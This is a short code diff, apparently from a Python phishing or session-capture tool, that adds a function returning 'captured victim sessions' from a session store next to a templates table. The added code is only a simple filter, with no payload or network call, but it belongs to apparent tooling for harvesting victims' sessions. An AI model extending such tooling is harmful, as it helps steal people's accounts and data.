@@ -489,6 +489,10 @@ def get_all_sessions():
         deduped.append(s)
     return deduped
 
+def get_captured_sessions():
+    """Returns all captured victim sessions."""
+    return [s for s in get_all_sessions() if s.get('status') == 'CAPTURED']
+
 def get_templates():
     conn = sqlite3.connect(Config.DB_PATH)
     try:
